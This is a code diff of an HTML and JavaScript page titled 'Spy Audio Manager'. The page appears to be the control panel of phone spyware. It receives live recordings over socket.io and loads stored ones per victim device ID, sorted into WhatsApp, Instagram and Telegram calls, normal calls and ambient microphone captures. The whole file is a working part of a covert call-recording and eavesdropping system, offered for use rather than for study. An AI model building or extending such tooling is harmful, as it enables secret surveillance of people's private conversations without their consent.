@@ -3,304 +3,346 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🕵️‍♂️ Call Recordings - Spy Dashboard</title>
+    <title>🕵️‍♂️ Spy Audio Manager</title>
     
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <script src="/socket.io/socket.io.js"></script>
 
     <style>
         :root {
-            --bg-color: #1a1a2e;
-            --card-color: #16213e;
-            --text-color: #e94560;
-            --highlight: #0f3460;
-            --white: #fff;
+            --bg: #0f172a;
+            --card-bg: #1e293b;
+            --accent: #ef4444; /* Red for Spy Theme */
+            --text-main: #f8fafc;
+            --text-sub: #94a3b8;
+            --border: #334155;
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--white);
+            font-family: 'Segoe UI', sans-serif;
+            background-color: var(--bg);
+            color: var(--text-main);
             margin: 0;
             padding: 20px;
         }
 
-        h1 {
-            text-align: center;
-            color: var(--text-color);
-            margin-bottom: 30px;
+        /* --- Header & Search --- */
+        .header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px;
+            gap: 15px;
         }
 
-        /* Tabs Styling */
+        h1 { margin: 0; font-size: 1.5rem; letter-spacing: 1px; }
+        
+        .search-box {
+            display: flex;
+            gap: 10px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        input {
+            flex: 1;
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            background: var(--card-bg);
+            color: white;
+            outline: none;
+        }
+
+        button.load-btn {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        /* --- Tabs --- */
         .tabs {
             display: flex;
-            justify-content: center;
             gap: 10px;
-            margin-bottom: 25px;
-            flex-wrap: wrap;
+            overflow-x: auto;
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+            justify-content: center;
         }
 
         .tab-btn {
-            background-color: var(--card-color);
-            border: 1px solid var(--highlight);
-            color: white;
-            padding: 10px 20px;
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            color: var(--text-sub);
+            padding: 8px 16px;
+            border-radius: 20px;
             cursor: pointer;
-            border-radius: 5px;
-            font-weight: bold;
+            white-space: nowrap;
             transition: 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 8px;
         }
 
-        .tab-btn:hover, .tab-btn.active {
-            background-color: var(--text-color);
-            transform: translateY(-2px);
-            box-shadow: 0 4px 10px rgba(233, 69, 96, 0.4);
+        .tab-btn.active, .tab-btn:hover {
+            background: var(--accent);
+            color: white;
+            border-color: var(--accent);
         }
 
-        /* Recording List Styling */
-        .recording-container {
+        /* --- List Layout --- */
+        .list-container {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 15px;
             max-width: 800px;
             margin: 0 auto;
         }
 
-        .recording-card {
-            background-color: var(--card-color);
+        /* --- Recording Card --- */
+        .card {
+            background: var(--card-bg);
+            border-radius: 12px;
             padding: 15px;
-            margin-bottom: 15px;
-            border-radius: 10px;
             display: flex;
-            align-items: center;
-            border-left: 5px solid var(--text-color);
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-            animation: slideIn 0.4s ease-out;
-            transition: transform 0.2s;
+            flex-direction: column;
+            gap: 10px;
+            border-left: 4px solid var(--accent);
+            animation: fadeIn 0.5s ease;
         }
 
-        .recording-card:hover {
-            transform: translateX(5px);
+        .card-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .app-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
         .app-icon {
-            font-size: 28px;
-            width: 50px;
-            height: 50px;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            border-radius: 50%;
+            font-size: 20px;
             background: rgba(255,255,255,0.05);
-            margin-right: 15px;
         }
 
-        /* App Specific Colors */
-        .icon-whatsapp { color: #25D366; }
-        .icon-instagram { color: #C13584; }
-        .icon-telegram { color: #0088cc; }
-        .icon-snapchat { color: #FFFC00; text-shadow: 0 0 2px black; }
-        .icon-call { color: #34b7f1; }
-        .icon-mic { color: #e94560; }
-
-        .info {
-            flex-grow: 1;
+        .meta {
+            display: flex;
+            flex-direction: column;
         }
 
-        .info h3 {
-            margin: 0;
-            font-size: 16px;
-            font-weight: 600;
-        }
-
-        .info p {
-            margin: 5px 0 0;
-            font-size: 12px;
-            color: #aaa;
-        }
-
-        .info .device-id {
-            font-size: 11px;
-            color: #666;
-            margin-top: 2px;
-            display: block;
-        }
+        .meta h3 { margin: 0; font-size: 16px; }
+        .meta p { margin: 0; font-size: 12px; color: var(--text-sub); }
 
         audio {
+            width: 100%;
             height: 35px;
-            outline: none;
-            border-radius: 20px;
-            max-width: 250px;
-        }
-
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+            margin-top: 5px;
         }
 
         /* Status Bar */
-        #status-msg {
+        #status-bar {
             text-align: center;
-            color: #aaa;
+            color: var(--text-sub);
             font-size: 14px;
-            margin-top: 50px;
+            margin-top: 20px;
+        }
+
+        /* App Specific Colors */
+        .whatsapp { color: #25D366; }
+        .instagram { color: #C13584; }
+        .telegram { color: #0088cc; }
+        .call { color: #3b82f6; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Desktop View */
+        @media (min-width: 768px) {
+            .list-container {
+                grid-template-columns: repeat(2, 1fr);
+            }
         }
     </style>
 </head>
 <body>
 
-    <h1>🎧 Live Audio Surveillance</h1>
+    <div class="header">
+        <h1>🎧 Audio Surveillance</h1>
+        
+        <div class="search-box">
+            <input type="text" id="deviceIdInput" placeholder="Enter Device ID (e.g., RAHUL)">
+            <button class="load-btn" onclick="fetchHistory()">Load</button>
+        </div>
+    </div>
 
     <div class="tabs">
-        <button class="tab-btn active" onclick="filterRecordings('all')">All</button>
-        <button class="tab-btn" onclick="filterRecordings('WhatsApp')"><i class="fab fa-whatsapp"></i> WhatsApp</button>
-        <button class="tab-btn" onclick="filterRecordings('Instagram')"><i class="fab fa-instagram"></i> Instagram</button>
-        <button class="tab-btn" onclick="filterRecordings('Telegram')"><i class="fab fa-telegram"></i> Telegram</button>
-        <button class="tab-btn" onclick="filterRecordings('Call')"><i class="fas fa-phone"></i> Calls</button>
-        <button class="tab-btn" onclick="filterRecordings('Mic')"><i class="fas fa-microphone"></i> Mic</button>
+        <button class="tab-btn active" onclick="filterBy('All')">All</button>
+        <button class="tab-btn" onclick="filterBy('WhatsApp')"><i class="fab fa-whatsapp"></i> WA</button>
+        <button class="tab-btn" onclick="filterBy('Instagram')"><i class="fab fa-instagram"></i> Insta</button>
+        <button class="tab-btn" onclick="filterBy('Call')"><i class="fas fa-phone"></i> Calls</button>
+        <button class="tab-btn" onclick="filterBy('Mic')"><i class="fas fa-microphone"></i> Mic</button>
     </div>
 
-    <div class="recording-container" id="recordingList">
-        </div>
-    
-    <div id="status-msg">
-        <i class="fas fa-satellite-dish"></i> Waiting for live incoming audio...
-    </div>
+    <div id="status-bar">Waiting for input...</div>
+    <div class="list-container" id="recordingsList"></div>
 
     <script>
-        // ✅ 1. Connect to Server
         const socket = io();
-        
-        // Array to store data in RAM (Server se aane wala data yahan jama hoga)
-        let allRecordings = []; 
-        let currentFilter = 'all';
+        let allRecordings = [];
+        let currentFilter = 'All';
+        let currentDeviceId = '';
 
-        console.log("🔌 Connecting to Spy Server...");
-
-        socket.on('connect', () => {
-            console.log("✅ Connected to Server! ID:", socket.id);
-            document.getElementById('status-msg').innerHTML = '<i class="fas fa-wifi"></i> Connected. Waiting for data...';
-        });
-
-        // ✅ 2. Listen for 'new-audio' event from Server
-        // (Server code: io.emit('new-audio', { device_id, url, name }))
+        // ✅ 1. LIVE SOCKET LISTENER
         socket.on('new-audio', (data) => {
-            console.log("🔊 New Audio Received:", data);
+            console.log("🔊 Live Audio Recieved:", data);
             
-            // Hide waiting message
-            document.getElementById('status-msg').style.display = 'none';
+            // Check if matches current device ID (or if showing all)
+            if(currentDeviceId && data.device_id !== currentDeviceId) return;
 
-            // Parse Data (Filename se App Name aur Date nikalo)
-            const processedData = processAudioData(data);
+            const processed = {
+                app: detectApp(data.name),
+                date: new Date().toLocaleDateString(),
+                time: new Date().toLocaleTimeString(),
+                url: data.url,
+                id: data.device_id
+            };
 
-            // Add to array (Sabse upar)
-            allRecordings.unshift(processedData);
-
-            // Refresh UI
-            renderList();
+            allRecordings.unshift(processed); // Add to top
+            render();
+            showStatus("⚡ New Recording Received!");
         });
 
-        // ✅ 3. Helper: Process Raw Data from Server
-        function processAudioData(data) {
-            let appName = "Unknown";
-            let rawName = data.name.toLowerCase();
+        // ✅ 2. FETCH HISTORY FROM API
+        async function fetchHistory() {
+            const inputVal = document.getElementById('deviceIdInput').value.trim().toUpperCase();
+            if(!inputVal) return alert("Please enter a Device ID!");
 
-            // Filename check karke App Name decide karo
-            if (rawName.includes("whatsapp")) appName = "WhatsApp";
-            else if (rawName.includes("instagram")) appName = "Instagram";
-            else if (rawName.includes("telegram")) appName = "Telegram";
-            else if (rawName.includes("snapchat")) appName = "Snapchat";
-            else if (rawName.includes("mic") || rawName.includes("ambient")) appName = "Mic"; // Ambient recording
-            else appName = "Normal Call";
+            currentDeviceId = inputVal;
+            showStatus("🔄 Fetching from server...");
+            document.getElementById('recordingsList').innerHTML = ''; // Clear list
 
-            // Timestamp (Agar filename me timestamp hai to wahan se lo, nahi to abhi ka time)
-            let date = new Date().toLocaleDateString();
-            let time = new Date().toLocaleTimeString();
+            try {
+                // Call the new Backend API
+                const res = await fetch(`/api/audio-history/${currentDeviceId}`);
+                const data = await res.json();
 
-            return {
-                device_id: data.device_id,
-                app: appName,
-                date: date,
-                time: time,
-                url: data.url
-            };
+                if(Array.isArray(data)) {
+                    allRecordings = data.map(file => processCloudinaryFile(file));
+                    render();
+                    showStatus(`✅ Loaded ${data.length} recordings.`);
+                } else {
+                    showStatus("❌ No recordings found.");
+                    allRecordings = [];
+                    render();
+                }
+
+            } catch (e) {
+                console.error(e);
+                showStatus("❌ Error fetching history.");
+            }
         }
 
-        // ✅ 4. Render Logic (Display List)
-        function renderList() {
-            const container = document.getElementById('recordingList');
-            container.innerHTML = ''; // Clear current list
+        // ✅ 3. RENDER UI
+        function render() {
+            const container = document.getElementById('recordingsList');
+            container.innerHTML = '';
 
-            // Filter Data
-            const filteredData = allRecordings.filter(item => {
-                if (currentFilter === 'all') return true;
-                if (currentFilter === 'Call') return item.app === "Normal Call";
-                return item.app === currentFilter;
-            });
+            const filtered = allRecordings.filter(rec => 
+                currentFilter === 'All' ? true : rec.app === currentFilter
+            );
 
-            if(filteredData.length === 0) {
-                if(allRecordings.length > 0) {
-                     container.innerHTML = `<p style="text-align:center; color:#666;">No recordings for ${currentFilter}</p>`;
-                }
+            if(filtered.length === 0) {
+                container.innerHTML = `<p style="text-align:center; color:#666; width:100%;">No data found.</p>`;
                 return;
             }
 
-            // Create HTML Cards
-            filteredData.forEach(rec => {
-                const iconClass = getIconClass(rec.app);
-                const iconIcon = getIconIcon(rec.app);
-                
-                const card = `
-                    <div class="recording-card">
-                        <div class="app-icon ${iconClass}">
-                            <i class="${iconIcon}"></i>
-                        </div>
-                        <div class="info">
-                            <h3>${rec.app}</h3>
-                            <p>${rec.date} • ${rec.time}</p>
-                            <span class="device-id">Device: ${rec.device_id}</span>
+            filtered.forEach(rec => {
+                const iconClass = rec.app.toLowerCase();
+                const icon = getIcon(rec.app);
+
+                const html = `
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="app-info">
+                                <div class="app-icon ${iconClass}">
+                                    <i class="${icon}"></i>
+                                </div>
+                                <div class="meta">
+                                    <h3>${rec.app}</h3>
+                                    <p>${rec.date} • ${rec.time}</p>
+                                </div>
+                            </div>
                         </div>
                         <audio controls controlsList="nodownload">
-                            <source src="${rec.url}" type="video/mp4"> <source src="${rec.url}" type="audio/mpeg">
-                            Your browser not support audio.
+                            <source src="${rec.url}" type="audio/mp4">
+                            <source src="${rec.url}" type="audio/mpeg">
                         </audio>
                     </div>
                 `;
-                container.innerHTML += card;
+                container.innerHTML += html;
             });
         }
 
-        // ✅ 5. Filter Handler
-        function filterRecordings(category) {
-            currentFilter = category;
-            
-            // Buttons UI Update
-            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-            event.currentTarget.classList.add('active'); // Use currentTarget specifically for button click
-            
-            renderList();
+        // --- Helpers ---
+
+        function processCloudinaryFile(file) {
+            const d = new Date(file.created_at);
+            return {
+                app: detectApp(file.filename || file.public_id),
+                date: d.toLocaleDateString(),
+                time: d.toLocaleTimeString(),
+                url: file.secure_url,
+                id: currentDeviceId
+            };
         }
 
-        // Helpers for Styling
-        function getIconClass(appName) {
-            if(appName === 'WhatsApp') return 'icon-whatsapp';
-            if(appName === 'Instagram') return 'icon-instagram';
-            if(appName === 'Telegram') return 'icon-telegram';
-            if(appName === 'Snapchat') return 'icon-snapchat';
-            if(appName === 'Mic') return 'icon-mic';
-            return 'icon-call';
+        function detectApp(name) {
+            if(!name) return "Call";
+            name = name.toLowerCase();
+            if(name.includes('whatsapp')) return 'WhatsApp';
+            if(name.includes('instagram')) return 'Instagram';
+            if(name.includes('telegram')) return 'Telegram';
+            if(name.includes('mic')) return 'Mic';
+            return 'Call';
         }
 
-        function getIconIcon(appName) {
-            if(appName === 'WhatsApp') return 'fab fa-whatsapp';
-            if(appName === 'Instagram') return 'fab fa-instagram';
-            if(appName === 'Telegram') return 'fab fa-telegram';
-            if(appName === 'Snapchat') return 'fab fa-snapchat-ghost';
-            if(appName === 'Mic') return 'fas fa-microphone-alt';
+        function getIcon(app) {
+            if(app === 'WhatsApp') return 'fab fa-whatsapp';
+            if(app === 'Instagram') return 'fab fa-instagram';
+            if(app === 'Mic') return 'fas fa-microphone';
             return 'fas fa-phone-alt';
         }
 
+        function filterBy(filter) {
+            currentFilter = filter;
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+            render();
+        }
+
+        function showStatus(msg) {
+            document.getElementById('status-bar').innerText = msg;
+        }
+
+        // Auto load if ID is in localStorage (Optional feature)
+        const lastId = localStorage.getItem('last_device_id');
+        if(lastId) {
+            document.getElementById('deviceIdInput').value = lastId;
+        }
     </script>
+
 </body>
 </html>
